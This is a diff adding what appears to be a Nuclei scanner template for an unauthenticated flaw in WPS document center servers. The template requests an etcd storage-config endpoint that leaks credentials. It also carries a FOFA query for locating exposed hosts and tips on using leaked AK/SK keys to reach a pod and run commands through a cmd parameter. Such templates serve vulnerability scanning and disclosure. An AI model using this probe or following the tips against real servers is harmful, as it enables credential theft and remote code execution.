@@ -1,0 +1,33 @@
+id: wps-wendangzhongxing-rce
+info:
+  name: WPS文档中心和文档中台存在远程代码执行 RCE
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/a09c3778c7df907941342afba5c18f08cd515d9c/WPS/WPS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4RCE.txt#L3
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="WPS文档中心" || icon_hash="-1870533495" || icon_hash="-214894291"
+    tips: |
+      1.获取 AKSK 后使用脚本添加 kubelet 路由映射（需TOKEN）
+      2.向对应POD发起通信后实现 RCE GET /open/wps/run/{namespace}/{podname}/node-exporter?cmd={url_encode_command}
+    repair:
+    version:
+  tags: wps,unauth,rce,disclosure
+
+http:
+  - raw:
+      - |
+        GET /open/v6/api/etcd/operate?key=/config/storage&method=get HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'data','value','request_id','request_time','response_time')
+          - contains_all(header,'application/json')
+        condition: and
